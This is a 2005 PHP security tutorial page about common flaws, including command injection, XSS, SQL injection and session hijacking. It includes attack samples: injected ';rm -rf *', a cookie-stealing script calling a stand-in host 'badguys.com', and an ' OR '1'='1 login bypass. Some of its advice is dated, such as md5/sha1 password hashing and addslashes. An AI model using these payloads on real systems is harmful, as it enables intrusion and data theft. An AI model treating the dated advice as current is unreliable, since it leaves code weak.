@@ -1,0 +1,838 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+      <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+
+<head>
+
+<title>Top 7 PHP Security Blunders</title>
+
+
+
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
+<meta name="robots" content="all" />
+<meta name="description" content="PHP's availability, ease of use, and support makes it the first choice for many budding developers. Yet the potential for the unwary coder to overlook certain key aspects of security lands countless developers in hot water. Pax explores the key security holes, common issues, and typical oversights in this hands-on primer. " />
+<meta name="keywords" content="php, security, users, application, data, input, file, flaws, malicious user, php applications, session id, php security" />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+	
+    <link rel="stylesheet" type="text/css" media="all" href="/css2/standard.css?ref=-1317203693" />
+
+    <link rel="stylesheet" type="text/css" media="all" href="/css2/tabs.css?random=-1317203693" />
+    <link rel="stylesheet" type="text/css" media="all" href="/css2/printstyle.css?random=-1317203693" />
+
+
+
+
+
+</head>
+
+<body id="body">
+
+
+<div id="header">
+	<a href="http://www.sitepoint.com/" title="Home" accesskey="1"><img src="/images/sitepoint-logo.gif" alt="Empowering Web Developers Since 1997" width="160" height="50" id="logo"  /></a>
+</div>
+
+  <!-- tabs - absolutely positioned -->
+	<div id="navcontainer">
+	<div id="tagline">Empowering Web Developers Since 1997</div>
+		
+		</div>
+
+<div id="tabbar"></div>
+<!-- /tabs  -->
+
+<!-- *********  Start Main content ******** -->
+
+  
+<div id="content"  class="clearfix">  
+<div id="maincontent">
+
+
+
+<!-- *********  Start maincontent ******** -->
+<div id="flow">
+<div id="tab">  
+
+<div class="product">
+	<h3>SitePoint Sponsor</h3>
+	<!-- text ads: start -->
+
+<div id="adwrap"  class="clearfix">
+<div class="textad" id="textad1"></div>
+<div class="textad" id="textad2"></div>
+</div>
+<!-- text ads  : end  --></div>
+
+<div class="wrap">
+	<h3>Article</h3>
+	
+	
+	<a name="content" class="nomargin"></a>
+	
+	
+		
+	
+	
+	
+	<!-- Crumb trail -->
+
+<div class="crumb"><a href="/">Home</a> ª <a href="/cat/server-side-coding">Server Side Coding</a> ª <a href="/subcat/php-tutorials">PHP & MySQL Tutorials</a> ª Page 					1
+		
+	</div>
+
+<div class="line"></div>
+<!-- End Crumb trail -->
+
+
+
+				<div id="topcontrols">
+
+					<span id="hiliteon"><a href='javascript:highlighton();' class="sublink" title="Highlight the searched text">HiLight On</a></span> 
+									
+					<span id="hiliteoff"><a href='javascript:highlightoff();' class="sublink" title="Switch the highlighted text off">HiLight Off</a></span>
+					
+
+					<a class="printicon" href="/print/php-security-blunders" title="Print-Friendly version">Print</a>
+		
+
+					
+					<a  class="emailicon" href="/email/php-security-blunders" onclick="acpopup(this.href,'console',450,280);return false;" title="Launch a window to send this article to a Friend">Email</a>
+
+					</div>
+				
+<br style='clear:both' /><div id="bio">
+
+		
+	<div class="boxes">
+	
+	  	
+	  <h4>Pax Dickinson</h4>
+	
+	  <p>
+	
+	    	      <img src="http://i2.sitepoint.com/graphics/author_pax.jpg" width="56" height="67"  alt="Pax Dickinson" />
+	    	
+	    Pax has over ten years of experience in systems administration and software development on a wide variety of hardware and software platforms. He's currently employed by <a class="sublink" href="http://www.guardiandigital.com">Guardian Digital</a> as a systems programmer, where he develops and implements open source security solutions using <a class="sublink" href="http://www.engardelinux.org">EnGarde Secure Linux</a>, and he is a regular security columnist at <a class="sublink" href="http://www.linuxsecurity.com">LinuxSecurity.com</a>. His experience includes UNIX and Windows systems engineering and support at several Fortune 500 companies, as well as consulting roles with many smaller businesses.
+	  </p>
+
+	
+	  	
+	</div>
+
+</div>
+
+
+
+
+<h1 id="title">Top 7 PHP Security Blunders</h1>
+			<div class='articledetail'>
+				<h4><a >By Pax Dickinson</a></h4>
+				<p class='date'>December 21st 2005</p>
+
+				<p class='date'>Reader Rating: 8.8</p>
+				 </div>
+				
+<p><strong><a href=\"/glossary.php?q=P#term_1\" class=\"glossary\" title=\"PHP, or Hypertext Preprocessor, is an open source, server-side programming language.\">PHP</a> <span class='tiny'>[1]</span> is a terrific language for the rapid development of dynamic Websites. It also has many features that are friendly to beginning programmers, such as the fact that it doesn't require variable declarations. However, many of these features can lead a programmer inadvertently to allow security holes to creep into a Web application. The popular security mailing lists teem with notes of flaws identified in PHP applications, but PHP can be as secure as any other language once you understand the basic types of flaws PHP applications tend to exhibit.</strong></p>
+
+<p>In this article, I'll detail many of the common PHP programming mistakes that can result in security holes. By showing you what not to do, and how each particular flaw can be exploited, I hope that you'll understand not just how to avoid these particular mistakes, but also why they result in security vulnerabilities. Understanding each possible flaw will help you avoid making the same mistakes in your PHP applications.</p>
+
+<p>Security is a process, not a product, and adopting a sound approach to security during the process of application development will allow you to produce tighter, more robust code.</p>
+
+<h5>Unvalidated Input Errors</h5>
+
+
+
+<p>One of -- if not the -- most common PHP security flaws is the unvalidated input error. User-provided data simply cannot be trusted. You should assume every one of your Web application users is malicious, since it's certain that some of them will be. Unvalidated or improperly validated input is the root cause of many of the exploits we'll discuss later in this article.</p>
+
+<p>As an example, you might write the following code to allow a user to view a calendar that displays a specified month by calling the <a href=\"/glossary.php?q=U#term_22\" class=\"glossary\" title=\"Multi-user, multitasking Operating System and set of specifications\">UNIX</a> <span class='tiny'>[2]</span> cal command.  </p>
+
+<p><code>$month = $_GET['month']; <br />
+$year = $_GET['year']; <br />
+ <br />
+exec(&quot;cal $month $year&quot;, $result); <br />
+print &quot;&lt;PRE&gt;&quot;; <br />
+foreach ($result as $r) { print &quot;$r&lt;BR&gt;&quot;; } <br />
+
+print &quot;&lt;/PRE&gt;&quot;;</code></p>
+
+<p>This code has a gaping security hole, since the <code>$_GET[month]</code> and <code>$_GET[year]</code> variables are not validated in any way. The application works perfectly, as long as the specified month is a number between 1 and 12, and the year is provided as a proper four-digit year. However, a malicious user might append <code>&quot;;ls -la&quot;</code> to the year value and thereby see a listing of your Website's <a href=\"/glossary.php?q=H#term_75\" class=\"glossary\" title=\"HTML stands for HyperText Markup Language.\">html</a> <span class='tiny'>[3]</span> directory. An extremely malicious user could append <code>&quot;;rm -rf *&quot;</code> to the year value and delete your entire Website!</p>
+
+<div id="adz" class="horizontal"></div>
+<p>The proper way to correct this is to ensure that the input you receive from the user is what you expect it to be. Do not use <a href=\"/glossary.php?q=J#term_9\" class=\"glossary\" title=\"JavaScript is a Web scripting language most commonly used for client-side applications.\">JavaScript</a> <span class='tiny'>[4]</span> validation for this; such validation methods are easily worked around by an exploiter who creates their own form or disables javascript. You need to add PHP code to ensure that the month and year inputs are digits and only digits, as shown below.</p>
+
+<p><code>$month = $_GET['month']; <br />
+$year = $_GET['year']; <br />
+ <br />
+if (!preg_match(&quot;/^[0-9]{1,2}$/&quot;, $month)) die(&quot;Bad month, please re-enter.&quot;); <br />
+
+if (!preg_match(&quot;/^[0-9]{4}$/&quot;, $year)) die(&quot;Bad year, please re-enter.&quot;); <br />
+ <br />
+exec(&quot;cal $month $year&quot;, $result); <br />
+print &quot;&lt;PRE&gt;&quot;; <br />
+foreach ($result as $r) { print &quot;$r&lt;BR&gt;&quot;; } <br />
+
+print &quot;&lt;/PRE&gt;&quot;;</code></p>
+
+<p>This code can safely be used without concern that a user could provide input that would compromise your application, or the server running it. Regular expressions are a great tool for input validation. They can be difficult to grasp, but are extremely useful in this type of situation.</p>
+
+<p>You should always validate your user-provided data by rejecting anything other than the expected data. Never use the approach that you'll accept anything except data you know to be harmful -- this is a common source of security flaws. Sometimes, malicious users can get around this methodology, for example, by including bad input but obscuring it with null characters. Such input would pass your checks, but could still have a harmful effect.</p>
+
+<p>You should be as restrictive as possible when you validate any input. If some characters don't need to be included, you should probably either strip them out, or reject the input completely. </p>
+
+<h5>Access Control Flaws</h5>
+
+
+<p>Another type of flaw that's not necessarily restricted to PHP applications, but is important nonetheless, is the access control type of vulnerability. This flaw rears its head when you have certain sections of your application that must be restricted to certain users, such as an administration page that allows configuration settings to be changed, or displays sensitive information.</p>
+
+<p>You should check the user's access privileges upon every load of a restricted page of your PHP application. If you check the user's credentials on the index page only, a malicious user could directly enter a URL to a &quot;deeper&quot; page, which would bypass this credential checking process.</p>
+
+<p>It's also advisable to layer your security, for example, by restricting user access on the basis of the user's IP address as well as their user name, if you have the luxury of writing an application for users that will have predictable or fixed IPs.  Placing your restricted pages in a separate directory that's protected by an <a href=\"/glossary.php?q=A#term_19\" class=\"glossary\" title=\"Apache is one of the world's most widely-used Web servers.\">apache</a> <span class='tiny'>[5]</span> .htaccess file is also good practice. </p>
+
+<p>Place configuration files outside your Web-<a href=\"/glossary.php?q=A#term_61\" class=\"glossary\" title=\"Accessibility deals with the issues of making online content available for experience, enjoyment, and use by all visitors, including those who do not fit the standard &quot;Web user&quot; mould.\">accessible</a> <span class='tiny'>[6]</span> directory. A configuration file can contain database passwords and other information that could be used by malicious users to penetrate or deface your site; never allow these files to be accessed by remote users. Use the PHP include function to include these files from a directory that's not Web-accessible, possibly including an .htaccess file containing &quot;deny from all&quot; just in case the directory is ever made Web-accessible by adiminstrator error.  Though this is redundant, layering security is a positive thing.</p>
+
+<p>For my PHP applications, I prefer a directory structure based on the sample below. All function libraries, classes and configuration files are stored in the includes directory. Always name these include files with a .php extension, so that even if all your protection is bypassed, the Web server will parse the PHP code, and will not display it to the user. The www and admin directories are the only directories whose files can be accessed directly by a URL; the admin directory is protected by an .htaccess file that allows users entry only if they know a user name and password that's stored in the .htpasswd file in the root directory of the site.</p>
+
+<p><code>/home <br />
+
+ &nbsp;/httpd <br />
+ &nbsp; &nbsp;/www.example.com <br />
+ &nbsp; &nbsp; &nbsp;.htpasswd <br />
+ &nbsp; &nbsp; &nbsp;/includes <br />
+
+ &nbsp; &nbsp; &nbsp; &nbsp;cart.class.php <br />
+ &nbsp; &nbsp; &nbsp; &nbsp;config.php <br />
+ &nbsp; &nbsp; &nbsp;/logs <br />
+
+ &nbsp; &nbsp; &nbsp; &nbsp;access_log <br />
+ &nbsp; &nbsp; &nbsp; &nbsp;error_log <br />
+ &nbsp; &nbsp; &nbsp;/www <br />
+
+ &nbsp; &nbsp; &nbsp; &nbsp;index.php <br />
+ &nbsp; &nbsp; &nbsp; &nbsp;/admin <br />
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.htaccess <br />
+
+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;index.php</code></p>
+
+<p>You should set your Apache directory indexes to 'index.php', and keep an index.php file in every directory. Set it to redirect to your main page if the directory should not be browsable, such as an images directory or similar.</p>
+
+<p>Never, ever, make a backup of a php file in your Web-exposed directory by adding .bak or another extension to the filename. Depending on the Web server you use (Apache thankfully appears to have safeguards for this), the PHP code in the file will not be parsed by the Web server, and may be output as source to a user who stumbles upon a URL to the backup file. If that file contained passwords or other sensitive information, that information would be readable -- it could even end up being indexed by Google if the spider stumbled upon it! Renaming files to have a .bak.php extension is safer than tacking a .bak onto the .php extension, but the best solution is to use a source code version control system like CVS. CVS can be complicated to learn, but the time you spend will pay off in many ways. The system saves every version of each file in your project, which can be invaluable when changes are made that cause problems later.</p>
+
+<h5>Session ID Protection</h5>
+
+
+<p>Session ID hijacking can be a problem with PHP Websites. The PHP session tracking component uses a unique ID for each user's session, but if this ID is known to another user, that person can hijack the user's session and see information that should be confidential.  Session ID hijacking cannot completely be prevented; you should know the risks so you can mitigate them.</p>
+
+<p>For instance, even after a user has been validated and assigned a session ID, you should revalidate that user when he or she performs any highly sensitive actions, such as resetting passwords. Never allow a session-validated user to enter a new password without also entering their old password, for example. You should also avoid displaying truly sensitive data, such as credit card numbers, to a user who has only been validated by session ID.</p>
+
+<p>A user who creates a new session by logging in should be assigned a fresh session ID using the <code>session_regenerate_id</code> function. A hijacking user will try to set his session ID prior to login; this can be prevented if you regenerate the ID at login.</p>
+
+<p>If your site is handling critical information such as credit card numbers, always use an SSL secured connection. This will help reduce session hijacking vulnerabilities since the session ID cannot be sniffed and easily hijacked.</p>
+
+<p>If your site is run on a shared Web server, be aware that any session variables can easily be viewed by any other users on the same server. Mitigate this vulnerability by storing all sensitive data in a database record that's keyed to the session ID rather than as a session variable. If you must store a password in a session variable (and I stress again that it's best just to avoid this), do not store the password in clear text; use the <code>sha1()</code> (PHP 4.3+) or <code>md5()</code> function to store the hash of the password instead.</p>
+
+<p><code>if ($_SESSION['password'] == $userpass) { <br />
+ &nbsp;// do sensitive things here <br />
+}</code></p>
+
+<p>The above code is not secure, since the password is stored in plain text in a session variable. Instead, use code more like this:</p>
+
+<p><code>if ($_SESSION['sha1password'] == sha1($userpass)) { <br />
+ &nbsp;// do sensitive things here <br />
+}</code></p>
+
+<p>The <code>SHA-1</code> algorithm is not without its flaws, and further advances in computing power are making it possible to generate what are known as collisions (different strings with the same SHA-1 sum). Yet the above technique is still vastly superior to storing passwords in clear text. Use <code>MD5</code> if you must -- since it's superior to a clear text-saved password -- but keep in mind that recent developments have made it possible to generate <code>MD5</code> collisions in less than an hour on standard PC hardware. Ideally, one should use a function that implements <code>SHA-256</code>; such a function does not currently ship with PHP and must be found separately.</p>
+
+<p>For further reading on hash collisions, among other security related topics, <a class=\"sublink\" href=\"http://www.schneier.com\">Bruce Schneier's Website</a> <span class='tiny'>[7]</span> is a great resource.</p>
+
+<h5>Cross Site Scripting (XSS) Flaws</h5>
+
+
+
+<p>Cross site scripting, or XSS, flaws are a subset of user validation where a malicious user embeds scripting commands -- usually JavaScript -- in data that is displayed and therefore executed by another user.</p>
+
+<p>For example, if your application included a forum in which people could post messages to be read by other users, a malicious user could embed a &lt;script&gt; tag, shown below, which would reload the page to a site controlled by them, pass your <a href=\"/glossary.php?q=C#term_59\" class=\"glossary\" title=\"Cookies are pieces of data that a Website uses to &quot;brand&quot; users' computers in order to identify them individually.\">cookie</a> <span class='tiny'>[8]</span> and session information as GET variables to their page, then reload your page as though nothing had happened. The malicious user could thereby collect other users' cookie and session information, and use this data in a session hijacking or other attack on your site.</p>
+
+<p><code>&lt;script&gt; <br />
+document.location = <br />
+ &nbsp; &nbsp;'http://www.badguys.com/cgi-bin/cookie.php?' + <br />
+
+ &nbsp; &nbsp;document.cookie; <br />
+&lt;/script&gt;</code></p>
+
+<p>To prevent this type of attack, you need to be careful about displaying user-submitted content verbatim on a Web page. The easiest way to protect against this is simply to escape the characters that make up HTML syntax (in particular, <code>&lt;</code> and <code>&gt;</code>) to HTML character entities (<code>&amp;lt;</code> and <code>&amp;gt;</code>), so that the submitted data is treated as plain text for display purposes. Just pass the data through PHP's <code>htmlspecialchars</code> function as you are producing the output.</p>
+
+<p>If your application requires that your users be able to submit HTML content and have it treated as such, you will instead need to filter out potentially harmful tags like <code>&lt;script&gt;</code>. This is best done when the content is first submitted, and will require a bit of regular expressions know-how.</p>
+
+<p><a class=\"sublink\" href=\"http://www.cgisecurity.com/articles/xss-faq.shtml\">The Cross Site Scripting FAQ</a> <span class='tiny'>[9]</span> at <a class=\"sublink\" href=\"http://www.cgisecurity.com/\">cgisecurity.com</a> <span class='tiny'>[10]</span> provides much more information and background on this type of flaw, and explains it well. I highly recommend reading and understanding it. XSS flaws can be difficult to spot and are one of the easier mistakes to make when programming a PHP application, as illustrated by the high number of XSS advisories issued on the popular security mailing lists.</p>
+
+
+
+<h5>SQL Injection Vulnerabilities</h5>
+
+
+
+<p>SQL injection vulnerabilities are yet another class of input validation flaws. Specifically, they allow for the exploitation of a database query. For example, in your PHP script, you might ask the user for a user ID and password, then check for the user by passing the database a query and checking the result.</p>
+
+<p><code>SELECT * FROM users WHERE name='$username' AND pass='$password';</code></p>
+
+<p>However, if the user who's logging in is devious, he may enter the following as his password:</p>
+
+<p><code>' OR '1'='1</code></p>
+
+<p>This results in the query being sent to the database as:</p>
+
+<p><code>SELECT * FROM users WHERE name='known_user' AND pass='' OR '1'='1';</code></p>
+
+<p>This will return the username without validating the password -- the malicious user has gained entry to your application as a user of his choice. To alleviate this problem, you need to escape dangerous characters from the user-submitted values, most particularly the single quotes ('). The simplest way to do this is to use PHP's <code>addslashes()</code> function.</p>
+
+<p><code>$username = addslashes($_POST[&quot;username&quot;]); <br />
+
+$password = addslashes($_POST[&quot;password&quot;]);</code></p>
+
+<p>But depending on your PHP configuration, this may not be necessary! PHP's much-reviled <strong>magic quotes</strong> feature is enabled by default in current versions of PHP. This feature, which can be disabled by setting the <code>magic_quotes_gpc</code> <code>php.ini</code> variable to <code>Off</code>, will automatically apply <code>addslashes</code> to all values submitted via GET, POST or cookies. This feature safeguards against inexperienced developers who might otherwise leave security holes like the one described above, but it has an unfortunate impact on performance when input values do not need to be escaped for use in database queries. Thus, most experienced developers elect to switch this feature off.</p>
+
+<p>If you're developing software that may be installed on shared servers where you might not be able to change the <code>php.ini</code> file, use code to check that status of <code>magic_quotes_gpc</code> and, if it is turned on, pass all input values through PHP's <code>stripslashes()</code> function. You can then apply <code>addslashes()</code> to any values destined for use in database queries as you would normally.</p>
+
+<p><code>if (get_magic_quotes_gpc()){ <br />
+
+ &nbsp;$_GET = array_map('stripslashes', $_GET); <br />
+ &nbsp;$_POST = array_map('stripslashes', $_POST); <br />
+ &nbsp;$_COOKIE = array_map('stripslashes', $_COOKIE); <br />
+}</code></p>
+
+<p>SQL injection flaws do not always lead to privilege escalation. For instance, they can allow a malicious user to output selected database records if the result of the query is printed to your HTML output.</p>
+
+<p>You should always check user-provided data that will be used in a query for the characters <code>'&quot;,;()</code> and, possibly, for the keywords <code>&quot;FROM&quot;</code>, <code>&quot;LIKE&quot;</code>, and <code>&quot;WHERE&quot;</code> in a case-insensitive fashion. These are the characters and keywords that are useful in a SQL insertion attack, so if you strip them from user inputs in which they're unnecessary, you'll have much less to worry about from this type of flaw.  </p>
+
+<h5>Error Reporting</h5>
+
+
+
+<p>You should ensure that your <code>display_errors</code> php.ini value is set to &quot;0&quot;. Otherwise, any errors that are encountered in your code, such as database connection errors, will be output to the end user's browser. A malicious user could leverage this flaw to gain information about the internal workings of your application, simply by providing bad input and reading the error messages that result.</p>
+
+<p>The <code>display_errors</code> value can be set at runtime using the <code>ini_set</code> function, but this is not as desirable as setting it in the ini file, since a fatal compilation error of your script will still be displayed: if the script has a fatal error and cannot run, the <code>ini_set</code> function is not run.</p>
+
+<p>Instead of displaying errors, set the <code>error_log</code> ini variable to &quot;1&quot; and check your PHP error log frequently for caught errors. Alternatively, you can develop your own error handling functions that are automatically invoked when PHP encounters an error, and can email you or execute other PHP code of your choice. This is a wise precaution to take, as you will be notified of an error and have it fixed possibly before malicious users even know the problem exists. Read the <a class=\"sublink\" href=\"http://www.php.net/errorfunc\">PHP manual pages on error handling</a> <span class='tiny'>[11]</span> and learn about the <code>set_error_handler()</code> function.</p>
+
+<h5>Data Handling Errors</h5>
+
+
+
+<p>Data handling errors aren't specific to PHP per se, but PHP application developers still need to be aware of them. This class of error arises when data is handled in an insecure manner, which makes it available to possible interception or modification by malicious parties.</p>
+
+<p>The most common type of data handling error is in the unencrypted HTTP transmission of sensitive data that should be transmitted via HTTPS. Credit card numbers and customer information are the most common types of secured data, but if you transmit usernames and passwords over a regular HTTP connection, and those usernames and passwords allow access to sensitive material, you might as well transmit the sensitive material itself over an unencrypted connection. Use SSL security whenever you transmit sensitive data from your application to a user's browser. Otherwise, a malicious eavesdropper on any router between your server and the end user can very easily sniff the sensitive information out of the network packets.</p>
+
+<p>The same type of risk can occur when applications are updated using FTP, which is an insecure protocol. Transferring a PHP file that contains database passwords to your remote Webserver over an insecure protocol like FTP can allow an eavesdropper to sniff the packets and reveal your password. Always use a secure protocol like SFTP or SCP to transmit sensitive files. Never allow sensitive information to be sent by your application via email, either. An email message is readable by anyone who's capable of reading the network traffic. A good rule of thumb is that if you wouldn't write the information on the back of a postcard and put it through the mail, you shouldn't send it via email, either. The chance anyone will actually intercept the message may be low, but why risk it? </p>
+
+<p>It's important to minimize your exposure to data handling flaws. For example, if your application is an online store, is it necessary to save the credit card numbers attached to orders that are more than six months old? Archive the data and store it offline, limiting the amount of data that can be compromised if your Webserver is breached. It's basic security practice not only to attempt to prevent an intrusion or compromise, but also to mitigate the negative effects of a successful compromise. No security system is ever perfect, so don't assume that yours is. Take steps to minimize the fallout if you do suffer a penetration. </p>
+
+<h5>Configuring PHP For Security</h5>
+
+
+
+<p>Generally, most new PHP installations that use recent PHP releases are configured with much stronger security defaults than was standard in past PHP releases. However, your application may be installed on a legacy server that has had its version of PHP upgraded, but not the php.ini file. In this case, the default settings may not be as secure as the default settings on a fresh install.</p>
+
+<p>You should create a page that calls the <code>phpinfo()</code> function to list your php.ini variables and scan them for insecure settings. Keep this page in a restricted place and do not allow public access to it. The output of <code>phpinfo()</code> contains information that a potential hacker might find extremely useful.</p>
+
+<p>Some settings to consider when configuring PHP for security include:</p>
+
+<p><ol>
+	<li><strong><code>register_globals</code></strong>: The boogeyman of PHP security is <code>register_globals</code>, which used to default to &quot;on&quot; in older releases of PHP but has since been changed to default to &quot;off&quot;.  It exports all user input as global variables. Check this setting and disable it -- no buts, no exceptions. Just do it! This setting is possibly responsible for more PHP security flaws than any other single cause. If you're on a shared host, and they won't let you disable <code>register_globals</code>, get a new host!</li></p>
+
+<p>	<li><strong><code>safe_mode</code></strong>: The safe mode setting can be very useful to prevent unauthorized access to local system files. It works by only allowing the reading of files that are owned by the user account that owns the executing PHP script. If your application opens local files often, consider enabling this setting.</li></p>
+
+<p>	<li><strong><code>disable_functions</code></strong>:  This setting can only be set in your php.ini file, not at runtime. It can be set to a list of functions that you would like disabled in your PHP installation. It can help prevent the possible execution of harmful PHP code. Some functions that are useful to disable if you do not use them are system and exec, which allow the execution of external programs.</li>
+</ol>
+</p>
+
+<p>Read the <a class=\"sublink\" href=\"http://www.php.net/manual/en/security.php\">security section of the PHP manual</a> <span class='tiny'>[12]</span> and get to know it well. Treat it as material for a test you'll take and get to know it backwards and forwards. You will be tested on the material by the hackers who will indubitably attempt to penetrate your site. You get a passing grade on the test if the hackers give up and move on to an easier target whose grasp of these concepts is insufficient.</p>
+
+<h5>Further Reading</h5>
+
+
+
+<p>The following sites are recommended reading to maintain your security knowledge.  New flaws and new forms of exploits are discovered all the time, so you cannot afford to rest on your laurels and assume you have all the bases covered. As I stated in the introduction to this article, &quot;Security is a process&quot;, but security education is also a process, and your knowledge must be maintained.</p>
+
+<p><a class=\"sublink\" href=\"http://www.owasp.org/index.jsp\">OWASP, The Open Web Application Security Project</a> <span class='tiny'>[13]</span>, is a non-profit oganisation dedicated to &quot;finding and fighting the causes of insecure software&quot;. The resources it provides are invaluable and the group has many local chapters that hold regular meetings with seminars and roundtable discussions.  Highly recommended.</p>
+
+<p><a class=\"sublink\" href=\"http://www.cgisecurity.net/\">CGISecurity.Net</a> <span class='tiny'>[14]</span> is another good site dealing with Web application security. They have some interesting FAQs and more in-depth documentation on some of the types of flaws I've discussed in this article.</p>
+
+<p><a class=\"sublink\" href=\"http://www.php.net/manual/en/security.php\">The security section of the PHP Manual</a> <span class='tiny'>[15]</span> is a key resource that I mentioned above, but I include it here again, since it's full of great information that's directly applicable to PHP. Don't gloss over the comments at the bottom of each page: some of the best and most up-to-date information can be found in the user-contributed notes.</p>
+
+<p><a class=\"sublink\" href=\"http://phpsec.org/\">The PHP Security Consortium</a> <span class='tiny'>[16]</span> offers a library with links to other helpful resources, PHP-specific summaries of the SecurityFocus newsletters, the PHP Security Guide, and a couple of articles.</p>
+
+<p><a class=\"sublink\" href=\"http://www.securityfocus.com/archive/1\">The BugTraq mailing list</a> <span class='tiny'>[17]</span> is a great source of security related advisories that you should read if you're interested in security in general. You may be shocked by the number of advisories that involve popular PHP applications allowing SQL insertion, Cross Site Scripting and some of the other flaws I've discussed here.</p>
+
+<p><a class=\"sublink\" href=\"http://www.linuxsecurity.com\">Linux Security</a> <span class='tiny'>[18]</span> is another good site that is not necessarily restricted to PHP but, since you are likely running a Linux Webserver to host your PHP applications, it's useful to try to stay up to date on the latest advisories and news related to your chosen Linux distribution. Don't assume your hosting company is on top of these developments; be aware on your own -- your security is only as good as your weakest point.  It does you no good to have a tightly secured PHP application running on a server with an outdated service that exposes a well-known and exploitable flaw. </p>
+
+<h5>Conclusions</h5>
+
+
+
+<p>As I've shown in this article, there are many things to be aware of when programming secure PHP applications, though this is true with any language, and any server platform. PHP is no less secure than many other common development languages. The most important thing is to develop a proper security mindset and to know your tools well. I hope you enjoyed this article and learned something as well! Remember: just because you're paranoid doesn't mean there's no one out to get you.</p>
+<p style='text-align: center'><a class='next' href='http://www.sitepoint.com'>Back to SitePoint.com</a></p>
+	
+				<p  class='tiny'>
+			
+			[1] /glossary.php?q=P#term_1<br />
+[2] /glossary.php?q=U#term_22<br />
+[3] /glossary.php?q=H#term_75<br />
+[4] /glossary.php?q=J#term_9<br />
+
+[5] /glossary.php?q=A#term_19<br />
+[6] /glossary.php?q=A#term_61<br />
+[7] http://www.schneier.com<br />
+[8] /glossary.php?q=C#term_59<br />
+[9] http://www.cgisecurity.com/articles/xss-faq.shtml<br />
+[10] http://www.cgisecurity.com/<br />
+[11] http://www.php.net/errorfunc<br />
+[12] http://www.php.net/manual/en/security.php<br />
+[13] http://www.owasp.org/index.jsp<br />
+
+[14] http://www.cgisecurity.net/<br />
+[15] http://www.php.net/manual/en/security.php<br />
+[16] http://phpsec.org/<br />
+[17] http://www.securityfocus.com/archive/1<br />
+[18] http://www.linuxsecurity.com<br />
+
+				</p>
+				
+
+
+			<script src="http://www.sitepoint.com/adjs.php?region=124&amp;did=adz&amp;adtype=horizontal" type="text/javascript"></script><div id="adt"><h5>Easy-to-understand books for web professionals</h5><ul><li><a href="http://www.sitepoint.com/launch/3567f1/3/1/">Build Your Own Database Driven Website Using PHP &amp; MySQL, 3rd ed.</a></li><li><a href="http://www.sitepoint.com/launch/3567f1/3/4/">The Web Design Business Kit</a></li><li><a href="http://www.sitepoint.com/launch/3567f1/3/13/">The CSS Anthology: 101 Essential Tips, Tricks &amp; Hacks</a></li></ul></div>
+
+<span class="crumb"> ª Page 					1
+		
+</span>
+
+	<div class="clearfix"> </div>
+	
+	<div id="dostuff">
+		<script type="text/javascript">
+	<!--
+	var txt = 'Bookmark This Article';
+	var url = 'http://www.sitepoint.com/article/php-security-blunders';
+	var who = 'Top 7 PHP Security Blunders';
+	var ver = navigator.appName
+	var num = parseInt(navigator.appVersion)
+	if ((ver == "Microsoft Internet Explorer")&&(num >= 4)) {
+	   document.write('<a  class="bookmarkicon" href="javascript:window.external.AddFavorite(url,who);" ');
+	   document.write('onMouseOver=" window.status=')
+	   document.write("txt; return true ")
+	   document.write('"onMouseOut=" window.status=')
+	   document.write("' '; return true ")
+	   document.write('">'+ txt + '</a>')
+	}
+	-->
+	</script>
+
+<a class="printicon"  href="/print/php-security-blunders">Print-Friendly Version</a>
+	<script type="text/javascript" src="/js/email.js"></script>
+
+	<a class="emailicon" href="/email/php-security-blunders" onclick="acpopup(this.href,'console',450,280);return false;" title="Launch a window to send this article to a Friend">Email to a Friend</a>
+  <a class="feedbackicon" href="/feedback/1503" onclick="acpopup(this.href,'console',450,280);return false;" title="Launch a window to send us feedback on this article">Give Author Feedback</a>
+  <a class="articlesuggesticon" href="/contact?reason=articlesuggest" title="Tell us which topic you would like to see us publish an article on">Suggest an Article</a>
+  <a class="linkicon" href="/linktothis/1503" onclick="acpopup(this.href,'console',450,280);return false;" title="Get a code snippet to link to this article">Link to this Article</a>
+</div>
+	
+</div> 
+
+
+
+
+
+
+</div><!-- end #tab -->
+</div><!-- end #flow -->
+
+<!-- ***************  Start Column 1 ************   -->
+
+<div id="col1">
+<div class="nav">
+<!-- Left Nav -->
+<h3>Topics</h3>
+<div id="navitem">
+	<h4><a href="/cat/before-you-code" title="Steps to be taken in planning your web sites or online applications">Before You Code</a></h4>
+	<ul>
+									<li><a href="/subcat/domain-names" title="How to choose, buy, manage and sell your domain names"> Domain Names</a></li>
+
+												<li><a href="/subcat/hosting" title="Information regarding selecting a hosting option for your site, and tips about hosting requirements"> Hosting</a></li>
+												<li><a href="/subcat/site-planning" title="Strategies and tutorials for planning your web site or online business before you start"> Site Planning</a></li>
+												<li><a href="/subcat/legal" title="Articles covering legal issues in relation to online businesses"> Legal Issues</a></li>
+												<li><a href="/subcat/privacy" title="How to deal with issues such as privacy and trust with regard to your website or web business"> Privacy and Trust</a></li>
+						</ul>
+
+	<h4><a href="/cat/design-and-layout" title="Graphic design and web site layout">Design and Layout</a></h4>
+	<ul>
+									<li><a href="/subcat/usability" title="Strategies for making sure your websites and user interfaces are easy to use"> Usability and Information Architecture</a></li>
+												<li><a href="/subcat/accessibility" title="Ways that you can make your web design accessible to the largest possible number of viewers"> Accessibility</a></li>
+												<li><a href="/subcat/design-principles" title="Design Principals"> Design Principles</a></li>
+
+												<li><a href="/subcat/design-practice" title="Articles covering graphic and web design practice."> Design Practice</a></li>
+												<li><a href="/subcat/design-tips" title="Tutorials and solutions to common problems in web design and graphic design for the web"> Design Tips &amp; Tricks</a></li>
+												<li><a href="/subcat/software-tutorials" title="Tutorials on using major software packages"> Software Tutorials</a></li>
+												<li><a href="/subcat/flash" title="Tutorials for creating graphics, animations and web applications using Macromedia Flash"> Flash Tutorials</a></li>
+
+						</ul>
+	<h4><a href="/cat/client-side-coding" title="Coding for the client side (the browser) using XHTML, Javascript, CSS">Client Side Coding</a></h4>
+	<ul>
+									<li><a href="/subcat/html" title="Articles and tutorials on how to mark up your pages using HTML and XHTML"> HTML &amp; XHTML Tutorials</a></li>
+												<li><a href="/subcat/css" title="Tutorials and tips on using Cascading Style Sheets (CSS) to style and lay out your web designs"> CSS Tutorials</a></li>
+
